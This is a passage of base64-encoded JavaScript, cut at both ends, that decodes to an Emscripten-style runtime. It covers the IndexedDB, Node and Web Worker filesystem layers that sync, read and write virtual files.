lPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKElEQkZTLkRCX1NUT1JFX05BTUUpO3ZhciBpbmRleD1zdG9yZS5pbmRleCgidGltZXN0YW1wIik7aW5kZXgub3BlbktleUN1cnNvcigpLm9uc3VjY2Vzcz0oZnVuY3Rpb24oZXZlbnQpe3ZhciBjdXJzb3I9ZXZlbnQudGFyZ2V0LnJlc3VsdDtpZighY3Vyc29yKXtyZXR1cm4gY2FsbGJhY2sobnVsbCx7dHlwZToicmVtb3RlIixkYjpkYixlbnRyaWVzOmVudHJpZXN9KX1lbnRyaWVzW2N1cnNvci5wcmltYXJ5S2V5XT17dGltZXN0YW1wOmN1cnNvci5rZXl9O2N1cnNvci5jb250aW51ZSgpfSl9KSl9KSxsb2FkTG9jYWxFbnRyeTooZnVuY3Rpb24ocGF0aCxjYWxsYmFjayl7dmFyIHN0YXQsbm9kZTt0cnl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgpO25vZGU9bG9va3VwLm5vZGU7c3RhdD1GUy5zdGF0KHBhdGgpfWNhdGNoKGUpe3JldHVybiBjYWxsYmFjayhlKX1pZihGUy5pc0RpcihzdGF0Lm1vZGUpKXtyZXR1cm4gY2FsbGJhY2sobnVsbCx7dGltZXN0YW1wOnN0YXQubXRpbWUsbW9kZTpzdGF0Lm1vZGV9KX1lbHNlIGlmKEZTLmlzRmlsZShzdGF0Lm1vZGUpKXtub2RlLmNvbnRlbnRzPU1FTUZTLmdldEZpbGVEYXRhQXNUeXBlZEFycmF5KG5vZGUpO3JldHVybiBjYWxsYmFjayhudWxsLHt0aW1lc3RhbXA6c3RhdC5tdGltZSxtb2RlOnN0YXQubW9kZSxjb250ZW50czpub2RlLmNvbnRlbnRzfSl9ZWxzZXtyZXR1cm4gY2FsbGJhY2sobmV3IEVycm9yKCJub2RlIHR5cGUgbm90IHN1cHBvcnRlZCIpKX19KSxzdG9yZUxvY2FsRW50cnk6KGZ1bmN0aW9uKHBhdGgsZW50cnksY2FsbGJhY2spe3RyeXtpZihGUy5pc0RpcihlbnRyeS5tb2RlKSl7RlMubWtkaXIocGF0aCxlbnRyeS5tb2RlKX1lbHNlIGlmKEZTLmlzRmlsZShlbnRyeS5tb2RlKSl7RlMud3JpdGVGaWxlKHBhdGgsZW50cnkuY29udGVudHMse2VuY29kaW5nOiJiaW5hcnkiLGNhbk93bjp0cnVlfSl9ZWxzZXtyZXR1cm4gY2FsbGJhY2sobmV3IEVycm9yKCJub2RlIHR5cGUgbm90IHN1cHBvcnRlZCIpKX1GUy5jaG1vZChwYXRoLGVudHJ5Lm1vZGUpO0ZTLnV0aW1lKHBhdGgsZW50cnkudGltZXN0YW1wLGVudHJ5LnRpbWVzdGFtcCl9Y2F0Y2goZSl7cmV0dXJuIGNhbGxiYWNrKGUpfWNhbGxiYWNrKG51bGwpfSkscmVtb3ZlTG9jYWxFbnRyeTooZnVuY3Rpb24ocGF0aCxjYWxsYmFjayl7dHJ5e3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoKTt2YXIgc3RhdD1GUy5zdGF0KHBhdGgpO2lmKEZTLmlzRGlyKHN0YXQubW9kZSkpe0ZTLnJtZGlyKHBhdGgpfWVsc2UgaWYoRlMuaXNGaWxlKHN0YXQubW9kZSkpe0ZTLnVubGluayhwYXRoKX19Y2F0Y2goZSl7cmV0dXJuIGNhbGxiYWNrKGUpfWNhbGxiYWNrKG51bGwpfSksbG9hZFJlbW90ZUVudHJ5OihmdW5jdGlvbihzdG9yZSxwYXRoLGNhbGxiYWNrKXt2YXIgcmVxPXN0b3JlLmdldChwYXRoKTtyZXEub25zdWNjZXNzPShmdW5jdGlvbihldmVudCl7Y2FsbGJhY2sobnVsbCxldmVudC50YXJnZXQucmVzdWx0KX0pO3JlcS5vbmVycm9yPShmdW5jdGlvbihlKXtjYWxsYmFjayh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KX0pLHN0b3JlUmVtb3RlRW50cnk6KGZ1bmN0aW9uKHN0b3JlLHBhdGgsZW50cnksY2FsbGJhY2spe3ZhciByZXE9c3RvcmUucHV0KGVudHJ5LHBhdGgpO3JlcS5vbnN1Y2Nlc3M9KGZ1bmN0aW9uKCl7Y2FsbGJhY2sobnVsbCl9KTtyZXEub25lcnJvcj0oZnVuY3Rpb24oZSl7Y2FsbGJhY2sodGhpcy5lcnJvcik7ZS5wcmV2ZW50RGVmYXVsdCgpfSl9KSxyZW1vdmVSZW1vdGVFbnRyeTooZnVuY3Rpb24oc3RvcmUscGF0aCxjYWxsYmFjayl7dmFyIHJlcT1zdG9yZS5kZWxldGUocGF0aCk7cmVxLm9uc3VjY2Vzcz0oZnVuY3Rpb24oKXtjYWxsYmFjayhudWxsKX0pO3JlcS5vbmVycm9yPShmdW5jdGlvbihlKXtjYWxsYmFjayh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KX0pLHJlY29uY2lsZTooZnVuY3Rpb24oc3JjLGRzdCxjYWxsYmFjayl7dmFyIHRvdGFsPTA7dmFyIGNyZWF0ZT1bXTtPYmplY3Qua2V5cyhzcmMuZW50cmllcykuZm9yRWFjaCgoZnVuY3Rpb24oa2V5KXt2YXIgZT1zcmMuZW50cmllc1trZXldO3ZhciBlMj1kc3QuZW50cmllc1trZXldO2lmKCFlMnx8ZS50aW1lc3RhbXA+ZTIudGltZXN0YW1wKXtjcmVhdGUucHVzaChrZXkpO3RvdGFsKyt9fSkpO3ZhciByZW1vdmU9W107T2JqZWN0LmtleXMoZHN0LmVudHJpZXMpLmZvckVhY2goKGZ1bmN0aW9uKGtleSl7dmFyIGU9ZHN0LmVudHJpZXNba2V5XTt2YXIgZTI9c3JjLmVudHJpZXNba2V5XTtpZighZTIpe3JlbW92ZS5wdXNoKGtleSk7dG90YWwrK319KSk7aWYoIXRvdGFsKXtyZXR1cm4gY2FsbGJhY2sobnVsbCl9dmFyIGNvbXBsZXRlZD0wO3ZhciBkYj1zcmMudHlwZT09PSJyZW1vdGUiP3NyYy5kYjpkc3QuZGI7dmFyIHRyYW5zYWN0aW9uPWRiLnRyYW5zYWN0aW9uKFtJREJGUy5EQl9TVE9SRV9OQU1FXSwicmVhZHdyaXRlIik7dmFyIHN0b3JlPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKElEQkZTLkRCX1NUT1JFX05BTUUpO2Z1bmN0aW9uIGRvbmUoZXJyKXtpZihlcnIpe2lmKCFkb25lLmVycm9yZWQpe2RvbmUuZXJyb3JlZD10cnVlO3JldHVybiBjYWxsYmFjayhlcnIpfXJldHVybn1pZigrK2NvbXBsZXRlZD49dG90YWwpe3JldHVybiBjYWxsYmFjayhudWxsKX19dHJhbnNhY3Rpb24ub25lcnJvcj0oZnVuY3Rpb24oZSl7ZG9uZSh0aGlzLmVycm9yKTtlLnByZXZlbnREZWZhdWx0KCl9KTtjcmVhdGUuc29ydCgpLmZvckVhY2goKGZ1bmN0aW9uKHBhdGgpe2lmKGRzdC50eXBlPT09ImxvY2FsIil7SURCRlMubG9hZFJlbW90ZUVudHJ5KHN0b3JlLHBhdGgsKGZ1bmN0aW9uKGVycixlbnRyeSl7aWYoZXJyKXJldHVybiBkb25lKGVycik7SURCRlMuc3RvcmVMb2NhbEVudHJ5KHBhdGgsZW50cnksZG9uZSl9KSl9ZWxzZXtJREJGUy5sb2FkTG9jYWxFbnRyeShwYXRoLChmdW5jdGlvbihlcnIsZW50cnkpe2lmKGVycilyZXR1cm4gZG9uZShlcnIpO0lEQkZTLnN0b3JlUmVtb3RlRW50cnkoc3RvcmUscGF0aCxlbnRyeSxkb25lKX0pKX19KSk7cmVtb3ZlLnNvcnQoKS5yZXZlcnNlKCkuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCl7aWYoZHN0LnR5cGU9PT0ibG9jYWwiKXtJREJGUy5yZW1vdmVMb2NhbEVudHJ5KHBhdGgsZG9uZSl9ZWxzZXtJREJGUy5yZW1vdmVSZW1vdGVFbnRyeShzdG9yZSxwYXRoLGRvbmUpfX0pKX0pfTt2YXIgTk9ERUZTPXtpc1dpbmRvd3M6ZmFsc2Usc3RhdGljSW5pdDooZnVuY3Rpb24oKXtOT0RFRlMuaXNXaW5kb3dzPSEhcHJvY2Vzcy5wbGF0Zm9ybS5tYXRjaCgvXndpbi8pfSksbW91bnQ6KGZ1bmN0aW9uKG1vdW50KXthc3NlcnQoRU5WSVJPTk1FTlRfSVNfTk9ERSk7cmV0dXJuIE5PREVGUy5jcmVhdGVOb2RlKG51bGwsIi8iLE5PREVGUy5nZXRNb2RlKG1vdW50Lm9wdHMucm9vdCksMCl9KSxjcmVhdGVOb2RlOihmdW5jdGlvbihwYXJlbnQsbmFtZSxtb2RlLGRldil7aWYoIUZTLmlzRGlyKG1vZGUpJiYhRlMuaXNGaWxlKG1vZGUpJiYhRlMuaXNMaW5rKG1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfXZhciBub2RlPUZTLmNyZWF0ZU5vZGUocGFyZW50LG5hbWUsbW9kZSk7bm9kZS5ub2RlX29wcz1OT0RFRlMubm9kZV9vcHM7bm9kZS5zdHJlYW1fb3BzPU5PREVGUy5zdHJlYW1fb3BzO3JldHVybiBub2RlfSksZ2V0TW9kZTooZnVuY3Rpb24ocGF0aCl7dmFyIHN0YXQ7dHJ5e3N0YXQ9ZnMubHN0YXRTeW5jKHBhdGgpO2lmKE5PREVGUy5pc1dpbmRvd3Mpe3N0YXQubW9kZT1zdGF0Lm1vZGV8KHN0YXQubW9kZSYxNDYpPj4xfX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9cmV0dXJuIHN0YXQubW9kZX0pLHJlYWxQYXRoOihmdW5jdGlvbihub2RlKXt2YXIgcGFydHM9W107d2hpbGUobm9kZS5wYXJlbnQhPT1ub2RlKXtwYXJ0cy5wdXNoKG5vZGUubmFtZSk7bm9kZT1ub2RlLnBhcmVudH1wYXJ0cy5wdXNoKG5vZGUubW91bnQub3B0cy5yb290KTtwYXJ0cy5yZXZlcnNlKCk7cmV0dXJuIFBBVEguam9pbi5hcHBseShudWxsLHBhcnRzKX0pLGZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nTWFwOnswOiJyIiwxOiJyKyIsMjoicisiLDY0OiJyIiw2NToicisiLDY2OiJyKyIsMTI5OiJyeCsiLDE5MzoicngrIiw1MTQ6IncrIiw1Nzc6InciLDU3ODoidysiLDcwNToid3giLDcwNjoid3grIiwxMDI0OiJhIiwxMDI1OiJhIiwxMDI2OiJhKyIsMTA4OToiYSIsMTA5MDoiYSsiLDExNTM6ImF4IiwxMTU0OiJheCsiLDEyMTc6ImF4IiwxMjE4OiJheCsiLDQwOTY6InJzIiw0MDk4OiJycysifSxmbGFnc1RvUGVybWlzc2lvblN0cmluZzooZnVuY3Rpb24oZmxhZ3Mpe2ZsYWdzJj1+MjA5NzE1MjtmbGFncyY9fjIwNDg7ZmxhZ3MmPX4zMjc2ODtmbGFncyY9fjUyNDI4ODtpZihmbGFncyBpbiBOT0RFRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmdNYXApe3JldHVybiBOT0RFRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmdNYXBbZmxhZ3NdfWVsc2V7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX19KSxub2RlX29wczp7Z2V0YXR0cjooZnVuY3Rpb24obm9kZSl7dmFyIHBhdGg9Tk9ERUZTLnJlYWxQYXRoKG5vZGUpO3ZhciBzdGF0O3RyeXtzdGF0PWZzLmxzdGF0U3luYyhwYXRoKX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9aWYoTk9ERUZTLmlzV2luZG93cyYmIXN0YXQuYmxrc2l6ZSl7c3RhdC5ibGtzaXplPTQwOTZ9aWYoTk9ERUZTLmlzV2luZG93cyYmIXN0YXQuYmxvY2tzKXtzdGF0LmJsb2Nrcz0oc3RhdC5zaXplK3N0YXQuYmxrc2l6ZS0xKS9zdGF0LmJsa3NpemV8MH1yZXR1cm57ZGV2OnN0YXQuZGV2LGlubzpzdGF0Lmlubyxtb2RlOnN0YXQubW9kZSxubGluazpzdGF0Lm5saW5rLHVpZDpzdGF0LnVpZCxnaWQ6c3RhdC5naWQscmRldjpzdGF0LnJkZXYsc2l6ZTpzdGF0LnNpemUsYXRpbWU6c3RhdC5hdGltZSxtdGltZTpzdGF0Lm10aW1lLGN0aW1lOnN0YXQuY3RpbWUsYmxrc2l6ZTpzdGF0LmJsa3NpemUsYmxvY2tzOnN0YXQuYmxvY2tzfX0pLHNldGF0dHI6KGZ1bmN0aW9uKG5vZGUsYXR0cil7dmFyIHBhdGg9Tk9ERUZTLnJlYWxQYXRoKG5vZGUpO3RyeXtpZihhdHRyLm1vZGUhPT11bmRlZmluZWQpe2ZzLmNobW9kU3luYyhwYXRoLGF0dHIubW9kZSk7bm9kZS5tb2RlPWF0dHIubW9kZX1pZihhdHRyLnRpbWVzdGFtcCE9PXVuZGVmaW5lZCl7dmFyIGRhdGU9bmV3IERhdGUoYXR0ci50aW1lc3RhbXApO2ZzLnV0aW1lc1N5bmMocGF0aCxkYXRlLGRhdGUpfWlmKGF0dHIuc2l6ZSE9PXVuZGVmaW5lZCl7ZnMudHJ1bmNhdGVTeW5jKHBhdGgsYXR0ci5zaXplKX19Y2F0Y2goZSl7aWYoIWUuY29kZSl0aHJvdyBlO3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfX0pLGxvb2t1cDooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3ZhciBwYXRoPVBBVEguam9pbjIoTk9ERUZTLnJlYWxQYXRoKHBhcmVudCksbmFtZSk7dmFyIG1vZGU9Tk9ERUZTLmdldE1vZGUocGF0aCk7cmV0dXJuIE5PREVGUy5jcmVhdGVOb2RlKHBhcmVudCxuYW1lLG1vZGUpfSksbWtub2Q6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUsZGV2KXt2YXIgbm9kZT1OT0RFRlMuY3JlYXRlTm9kZShwYXJlbnQsbmFtZSxtb2RlLGRldik7dmFyIHBhdGg9Tk9ERUZTLnJlYWxQYXRoKG5vZGUpO3RyeXtpZihGUy5pc0Rpcihub2RlLm1vZGUpKXtmcy5ta2RpclN5bmMocGF0aCxub2RlLm1vZGUpfWVsc2V7ZnMud3JpdGVGaWxlU3luYyhwYXRoLCIiLHttb2RlOm5vZGUubW9kZX0pfX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9cmV0dXJuIG5vZGV9KSxyZW5hbWU6KGZ1bmN0aW9uKG9sZE5vZGUsbmV3RGlyLG5ld05hbWUpe3ZhciBvbGRQYXRoPU5PREVGUy5yZWFsUGF0aChvbGROb2RlKTt2YXIgbmV3UGF0aD1QQVRILmpvaW4yKE5PREVGUy5yZWFsUGF0aChuZXdEaXIpLG5ld05hbWUpO3RyeXtmcy5yZW5hbWVTeW5jKG9sZFBhdGgsbmV3UGF0aCl9Y2F0Y2goZSl7aWYoIWUuY29kZSl0aHJvdyBlO3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfX0pLHVubGluazooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3ZhciBwYXRoPVBBVEguam9pbjIoTk9ERUZTLnJlYWxQYXRoKHBhcmVudCksbmFtZSk7dHJ5e2ZzLnVubGlua1N5bmMocGF0aCl9Y2F0Y2goZSl7aWYoIWUuY29kZSl0aHJvdyBlO3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pfX0pLHJtZGlyOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dmFyIHBhdGg9UEFUSC5qb2luMihOT0RFRlMucmVhbFBhdGgocGFyZW50KSxuYW1lKTt0cnl7ZnMucm1kaXJTeW5jKHBhdGgpfWNhdGNoKGUpe2lmKCFlLmNvZGUpdGhyb3cgZTt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX19KSxyZWFkZGlyOihmdW5jdGlvbihub2RlKXt2YXIgcGF0aD1OT0RFRlMucmVhbFBhdGgobm9kZSk7dHJ5e3JldHVybiBmcy5yZWFkZGlyU3luYyhwYXRoKX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSksc3ltbGluazooZnVuY3Rpb24ocGFyZW50LG5ld05hbWUsb2xkUGF0aCl7dmFyIG5ld1BhdGg9UEFUSC5qb2luMihOT0RFRlMucmVhbFBhdGgocGFyZW50KSxuZXdOYW1lKTt0cnl7ZnMuc3ltbGlua1N5bmMob2xkUGF0aCxuZXdQYXRoKX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSkscmVhZGxpbms6KGZ1bmN0aW9uKG5vZGUpe3ZhciBwYXRoPU5PREVGUy5yZWFsUGF0aChub2RlKTt0cnl7cGF0aD1mcy5yZWFkbGlua1N5bmMocGF0aCk7cGF0aD1OT0RFSlNfUEFUSC5yZWxhdGl2ZShOT0RFSlNfUEFUSC5yZXNvbHZlKG5vZGUubW91bnQub3B0cy5yb290KSxwYXRoKTtyZXR1cm4gcGF0aH1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSl9LHN0cmVhbV9vcHM6e29wZW46KGZ1bmN0aW9uKHN0cmVhbSl7dmFyIHBhdGg9Tk9ERUZTLnJlYWxQYXRoKHN0cmVhbS5ub2RlKTt0cnl7aWYoRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpKXtzdHJlYW0ubmZkPWZzLm9wZW5TeW5jKHBhdGgsTk9ERUZTLmZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nKHN0cmVhbS5mbGFncykpfX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSksY2xvc2U6KGZ1bmN0aW9uKHN0cmVhbSl7dHJ5e2lmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSYmc3RyZWFtLm5mZCl7ZnMuY2xvc2VTeW5jKHN0cmVhbS5uZmQpfX1jYXRjaChlKXtpZighZS5jb2RlKXRocm93IGU7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fSkscmVhZDooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXtpZihsZW5ndGg9PT0wKXJldHVybiAwO3ZhciBuYnVmZmVyPW5ldyBCdWZmZXIobGVuZ3RoKTt2YXIgcmVzO3RyeXtyZXM9ZnMucmVhZFN5bmMoc3RyZWFtLm5mZCxuYnVmZmVyLDAsbGVuZ3RoLHBvc2l0aW9uKX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX1pZihyZXM+MCl7Zm9yKHZhciBpPTA7aTxyZXM7aSsrKXtidWZmZXJbb2Zmc2V0K2ldPW5idWZmZXJbaV19fXJldHVybiByZXN9KSx3cml0ZTooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXt2YXIgbmJ1ZmZlcj1uZXcgQnVmZmVyKGJ1ZmZlci5zdWJhcnJheShvZmZzZXQsb2Zmc2V0K2xlbmd0aCkpO3ZhciByZXM7dHJ5e3Jlcz1mcy53cml0ZVN5bmMoc3RyZWFtLm5mZCxuYnVmZmVyLDAsbGVuZ3RoLHBvc2l0aW9uKX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKX1yZXR1cm4gcmVzfSksbGxzZWVrOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LHdoZW5jZSl7dmFyIHBvc2l0aW9uPW9mZnNldDtpZih3aGVuY2U9PT0xKXtwb3NpdGlvbis9c3RyZWFtLnBvc2l0aW9ufWVsc2UgaWYod2hlbmNlPT09Mil7aWYoRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpKXt0cnl7dmFyIHN0YXQ9ZnMuZnN0YXRTeW5jKHN0cmVhbS5uZmQpO3Bvc2l0aW9uKz1zdGF0LnNpemV9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSl9fX1pZihwb3NpdGlvbjwwKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfXJldHVybiBwb3NpdGlvbn0pfX07dmFyIFdPUktFUkZTPXtESVJfTU9ERToxNjg5NSxGSUxFX01PREU6MzMyNzkscmVhZGVyOm51bGwsbW91bnQ6KGZ1bmN0aW9uKG1vdW50KXthc3NlcnQoRU5WSVJPTk1FTlRfSVNfV09SS0VSKTtpZighV09SS0VSRlMucmVhZGVyKVdPUktFUkZTLnJlYWRlcj1uZXcgRmlsZVJlYWRlclN5bmM7dmFyIHJvb3Q9V09SS0VSRlMuY3JlYXRlTm9kZShudWxsLCIvIixXT1JLRVJGUy5ESVJfTU9ERSwwKTt2YXIgY3JlYXRlZFBhcmVudHM9e307ZnVuY3Rpb24gZW5zdXJlUGFyZW50KHBhdGgpe3ZhciBwYXJ0cz1wYXRoLnNwbGl0KCIvIik7dmFyIHBhcmVudD1yb290O2Zvcih2YXIgaT0wO2k8cGFydHMubGVuZ3RoLTE7aSsrKXt2YXIgY3Vycj1wYXJ0cy5zbGljZSgwLGkrMSkuam9pbigiLyIpO2lmKCFjcmVhdGVkUGFyZW50c1tjdXJyXSl7Y3JlYXRlZFBhcmVudHNbY3Vycl09V09SS0VSRlMuY3JlYXRlTm9kZShwYXJlbnQscGFydHNbaV0sV09SS0VSRlMuRElSX01PREUsMCl9cGFyZW50PWNyZWF0ZWRQYXJlbnRzW2N1cnJdfXJldHVybiBwYXJlbnR9ZnVuY3Rpb24gYmFzZShwYXRoKXt2YXIgcGFydHM9cGF0aC5zcGxpdCgiLyIpO3JldHVybiBwYXJ0c1twYXJ0cy5sZW5ndGgtMV19QXJyYXkucHJvdG90eXBlLmZvckVhY2guY2FsbChtb3VudC5vcHRzWyJmaWxlcyJdfHxbXSwoZnVuY3Rpb24oZmlsZSl7V09SS0VSRlMuY3JlYXRlTm9kZShlbnN1cmVQYXJlbnQoZmlsZS5uYW1lKSxiYXNlKGZpbGUubmFtZSksV09SS0VSRlMuRklMRV9NT0RFLDAsZmlsZSxmaWxlLmxhc3RNb2RpZmllZERhdGUpfSkpOyhtb3VudC5vcHRzWyJibG9icyJdfHxbXSkuZm9yRWFjaCgoZnVuY3Rpb24ob2JqKXtXT1JLRVJGUy5jcmVhdGVOb2RlKGVuc3VyZVBhcmVudChvYmpbIm5hbWUiXSksYmFzZShvYmpbIm5hbWUiXSksV09SS0VSRlMuRklMRV9NT0RFLDAsb2JqWyJkYXRhIl0pfSkpOyhtb3VudC5vcHRzWyJwYWNrYWdlcyJdfHxbXSkuZm9yRWFjaCgoZnVuY3Rpb24ocGFjayl7cGFja1sibWV0YWRhdGEiXS5maWxlcy5mb3JFYWNoKChmdW5jdGlvbihmaWxlKXt2YXIgbmFtZT1maWxlLmZpbGVuYW1lLnN1YnN0cigxKTtXT1JLRVJGUy5jcmVhdGVOb2RlKGVuc3VyZVBhcmVudChuYW1lKSxiYXNlKG5hbWUpLFdPUktFUkZTLkZJTEVfTU9ERSwwLHBhY2tbImJsb2IiXS5zbGljZShmaWxlLnN0YXJ0LGZpbGUuZW5kKSl9KSl9KSk7cmV0dXJuIHJvb3R9KSxjcmVhdGVOb2RlOihmdW5jdGlvbihwYXJlbnQsbmFtZSxtb2RlLGRldixjb250ZW50cyxtdGltZSl7dmFyIG5vZGU9RlMuY3JlYXRlTm9kZShwYXJlbnQsbmFtZSxtb2RlKTtub2RlLm1vZGU9bW9kZTtub2RlLm5vZGVfb3BzPVdPUktFUkZTLm5vZGVfb3BzO25vZGUuc3RyZWFtX29wcz1XT1JLRVJGUy5zdHJlYW1fb3BzO25vZGUudGltZXN0YW1wPShtdGltZXx8bmV3IERhdGUpLmdldFRpbWUoKTthc3NlcnQoV09SS0VSRlMuRklMRV9NT0RFIT09V09SS0VSRlMuRElSX01PREUpO2lmKG1vZGU9PT1XT1JLRVJGUy5GSUxFX01PREUpe25vZGUuc2l6ZT1jb250ZW50cy5zaXplO25vZGUuY29udGVudHM9Y29udGVudHN9ZWxzZXtub2RlLnNpemU9NDA5Njtub2RlLmNvbnRlbnRzPXt9fWlmKHBhcmVudCl7cGFyZW50LmNvbnRlbnRzW25hbWVdPW5vZGV9cmV0dXJuIG5vZGV9KSxub2RlX29wczp7Z2V0YXR0cjooZnVuY3Rpb24obm9kZSl7cmV0dXJue2RldjoxLGlubzp1bmRlZmluZWQsbW9kZTpub2RlLm1vZGUsbmxpbms6MSx1aWQ6MCxnaWQ6MCxyZGV2OnVuZGVmaW5lZCxzaXplOm5vZGUuc2l6ZSxhdGltZTpuZXcgRGF0ZShub2RlLnRpbWVzdGFtcCksbXRpbWU6bmV3IERhdGUobm9kZS50aW1lc3RhbXApLGN0aW1lOm5ldyBEYXRlKG5vZGUudGltZXN0YW1wKSxibGtzaXplOjQwOTYsYmxvY2tzOk1hdGguY2VpbChub2RlLnNpemUvNDA5Nil9fSksc2V0YXR0cjooZnVuY3Rpb24obm9kZSxhdHRyKXtpZihhdHRyLm1vZGUhPT11bmRlZmluZWQpe25vZGUubW9kZT1hdHRyLm1vZGV9aWYoYXR0ci50aW1lc3RhbXAhPT11bmRlZmluZWQpe25vZGUudGltZXN0YW1wPWF0dHIudGltZXN0YW1wfX0pLGxvb2t1cDooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9KSxta25vZDooZnVuY3Rpb24ocGFyZW50LG5hbWUsbW9kZSxkZXYpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0pLHJlbmFtZTooZnVuY3Rpb24ob2xkTm9kZSxuZXdEaXIsbmV3TmFtZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfSksdW5saW5rOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfSkscm1kaXI6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9KSxyZWFkZGlyOihmdW5jdGlvbihub2RlKXt2YXIgZW50cmllcz1bIi4iLCIuLiJdO2Zvcih2YXIga2V5IGluIG5vZGUuY29udGVudHMpe2lmKCFub2RlLmNvbnRlbnRzLmhhc093blByb3BlcnR5KGtleSkpe2NvbnRpbnVlfWVudHJpZXMucHVzaChrZXkpfXJldHVybiBlbnRyaWVzfSksc3ltbGluazooZnVuY3Rpb24ocGFyZW50LG5ld05hbWUsb2xkUGF0aCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfSkscmVhZGxpbms6KGZ1bmN0aW9uKG5vZGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0pfSxzdHJlYW1fb3BzOntyZWFkOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24pe2lmKHBvc2l0aW9uPj1zdHJlYW0ubm9kZS5zaXplKXJldHVybiAwO3ZhciBjaHVuaz1zdHJlYW0ubm9kZS5jb250ZW50cy5zbGljZShwb3NpdGlvbixwb3NpdGlvbitsZW5ndGgpO3ZhciBhYj1XT1JLRVJGUy5yZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoY2h1bmspO2J1ZmZlci5zZXQobmV3IFVpbnQ4QXJyYXkoYWIpLG9mZnNldCk7cmV0dXJuIGNodW5rLnNpemV9KSx3cml0ZTooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfSksbGxzZWVrOihmdW5jdGlvbihzdHJlYW0sb2Zmc2V0LHdoZW5jZSl7dmFyIHBvc2l0aW9uPW9mZnNldDtpZih3aGVuY2U9PT0xKXtwb3NpdGlvbis9c3RyZWFtLnBvc2l0aW9ufWVsc2UgaWYod2hlbmNlPT09Mil7aWYo